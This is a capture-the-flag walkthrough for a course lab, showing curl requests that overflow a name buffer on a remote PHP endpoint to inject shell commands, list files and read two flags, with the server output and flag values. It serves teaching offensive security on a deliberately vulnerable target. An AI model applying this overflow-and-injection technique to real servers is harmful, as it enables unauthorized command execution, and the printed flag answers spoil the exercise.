# Command Execution in Remote Server

This file contains instructions for completing the challenges found in [Project ED201](https://samsclass.info/127/proj/ED201c.htm).

The goal is to use shell commands to get the two flags inside a remote server.

## Export endpoint for ease

```bash
❯ url=https://attack3214.samsclass.info/bufo1/bufo.php
```

## Initial fuzz, 40 characters

```bash
❯ python3 -c "print('A'*40)"      

AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA


❯ curl -X POST -H "content-type: application/x-www-form-urlencoded" -d "name=AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAA" $url

You sent <b>AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</b><br>After sanitizing, it became <b>AAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAA</b><p>Executing dash shell command<b><blockquote>/var/www/html/bufo AAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAA</blockquote></b><hr><pre>Name buffer address:    bffffbb0                                         
Command buffer address: bffffbd8                                                                                 
Name: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA                                                                   
Executing command:                                                                                               
</pre><hr><p>%
```

## List flags in current working directory

```bash
❯ curl -X POST -H "content-type: application/x-www-form-urlencoded" -d "name=AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAls" $url                   

You sent <b>AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAls</b><br>After sanitizing, it became <b>AAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAls</b><p>Executing dash shell command<b><blockquote>/var/www/html/bufo AAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAls</blockquote></b><hr><pre>Name buffer address:    bffffbb0                                   
Command buffer address: bffffbd8                                                                                 
Name: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAls                                                                 
Executing command: ls           
bufo.htm                       
bufo.php                     
flag1         
secret                         
</pre><hr><p>%
```

## Getting `flag1`

```bash
❯ curl -X POST -H "content-type: application/x-www-form-urlencoded" -d "name='AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAcat flag1'" $url

You sent <b>'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAcat flag1'</b><br>After sanitizing, it became <b>'AAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAcat flag1'</b><p>Executing dash shell command<b><blockquote>/var/www/html/bufo 'AAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAcat flag1'</blockquote></b><hr><pre>Name buffer address:    bffffbb0
Command buffer address: bffffbd8
Name: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAcat flag1
Executing command: cat flag1 
plain-sight</pre><hr><p>%
```

## Finding `flag2`

```bash
❯ curl -X POST -H "content-type: application/x-www-form-urlencoded" -d "name='AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAlocate flag2'" $url

You sent <b>'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAlocate flag2'</b><br>After sanitizing, it became <b>'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAlocate flag2'</b><p>Executing dash shell command<b><blockquote>/var/www/html/bufo 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAlocate flag2'</blockquote><b><hr><pre>Name buffer address:    bffffba0
Command buffer address: bffffbc8
Name: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAlocate flag2
Executing command: locate flag2
/var/www/html/bufo1/secret/flag2
/var/www/html/chal/sub/flag2.txt
</pre><hr><p>%
```

## Getting `flag2`

I used the more complex way of piping the output and taking the first row because the input was sanitized for slashes and dots:

```bash

❯ curl -X POST -H "content-type: application/x-www-form-urlencoded" -d "name='AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAcat \$(locate flag2 | head -n1)'" $url
```

```markup
You sent <b>'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAcat $(locate flag2 | head -n1)'</b><br>After sanitizing, it became<b>'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAcat $(locate flag2 | head -n1'</b><p>Executing dash shell command<b><blockquote>/var/www/html/bufo 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAcat $(locate flag2 | head -n1'<blockquote></b><hr><pre>Name buffer address:    bffffb90
Command buffer address: bffffbb8
Name: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAcat $(locate flag2 | head -n1)
Executing command: cat $(locate flag2 | head -n1)
harder</pre><hr><p>%
```
